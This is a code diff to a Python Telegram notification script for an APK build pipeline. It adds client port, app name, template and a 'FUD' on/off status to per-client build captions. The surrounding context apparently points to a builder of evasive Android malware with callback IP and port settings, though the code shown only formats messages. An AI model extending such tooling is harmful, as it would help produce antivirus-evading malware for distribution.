@@ -560,6 +560,9 @@ def main():
     parser.add_argument("--commit",      default="", dest="commit")
     parser.add_argument("--client-name", default="", dest="client_name")
     parser.add_argument("--client-ip",   default="", dest="client_ip")
+    parser.add_argument("--client-port", default="", dest="client_port")
+    parser.add_argument("--app-name",    default="", dest="app_name")
+    parser.add_argument("--fud-status",  default="", dest="fud_status")
     # ── sub-step mode: called from build_module.py for per-phase updates ──────
     # Usage:
     #   python3 telegram_notify.py \
@@ -684,6 +687,9 @@ def main():
             apk_filename = " ".join(parts) + ".apk"
 
         # ── Build caption ─────────────────────────────────────────────────────
+        import datetime as _dt
+        built_at = _dt.datetime.utcnow().strftime("%d %b %Y, %-I:%M %p") + " UTC"
+
         if is_dev:
             caption = (
                 f"📦 <b>Build #{args.build} — {emoji} {display_name}</b>\n"
@@ -692,16 +698,34 @@ def main():
             )
             if commit_short:
                 caption += f"\nCommit   : <code>{commit_short}</code>"
+            caption += f"\nBuilt    : {built_at}"
         else:
+            # Resolve app name: custom > arg > template display name
+            _app_name     = args.app_name or display_name
+            # Resolve template label (companion special case handled via display_name already)
+            _template_lbl = display_name
+            # FUD label
+            _fud = args.fud_status.upper()
+            if _fud in ("1", "ON", "TRUE", "YES"):
+                _fud_lbl = "ON 🟢"
+            elif _fud in ("0", "OFF", "FALSE", "NO"):
+                _fud_lbl = "OFF 🔴"
+            else:
+                _fud_lbl = "—"
             caption = (
                 f"📦 <b>Build #{args.build} — {emoji} {display_name}</b>\n"
                 f"Client   : {args.client_name or args.client}\n"
+                f"App      : {_app_name}\n"
+                f"Template : {_template_lbl}\n"
+                f"FUD      : {_fud_lbl}\n"
                 f"IP       : <code>{args.client_ip or 'N/A'}</code>\n"
+                f"Port     : <code>{args.client_port or 'N/A'}</code>\n"
                 f"Package  : <code>{args.pkg}</code>\n"
                 f"Size     : {args.apk_size}"
             )
             if commit_short:
                 caption += f"\nCommit   : <code>{commit_short}</code>"
+            caption += f"\nBuilt    : {built_at}"
 
         # ── Inline keyboard: Rebuild + Cancel directly on the APK message ───────
         # Buttons appear attached to the APK file in chat — no navigation needed.
